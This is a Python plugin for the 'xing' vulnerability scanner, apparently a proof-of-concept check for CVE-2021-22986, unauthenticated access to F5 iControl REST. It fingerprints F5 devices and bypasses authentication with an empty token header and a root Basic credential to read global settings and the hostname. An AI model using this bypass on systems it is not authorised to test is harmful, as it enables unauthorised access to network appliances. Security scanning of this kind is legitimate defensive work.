from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "F5 iControl REST 未授权访问 (CVE-2021-22986)"
        self.app_name = 'F5'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        if not self.is_f5(target):
            return

        self.logger.debug("found f5 {}".format(target))

        headers = {
            "X-F5-Auth-Token": "",
            "Authorization": "Basic cm9vdDo="
        }
        check = b"tm:sys:global-settings:global-settingsstate"
        url = target + "/mgmt/tm/sys/global-settings"
        conn = http_req(url, headers=headers)
        if conn.status_code != 200:
            return

        if check not in conn.content:
            return

        data = conn.json()
        hostname = data.get("hostname")
        ret = {
            "hostname": hostname
        }
        self.logger.success("found f5 rce {} {}".format(target, hostname))

        if hostname:
            return ret

        return target

    def is_f5(self, target):
        url = target + "/restui/default/js/session.js"
        conn = http_req(url)
        if b'mgmt.*/' in conn.content:
            return True
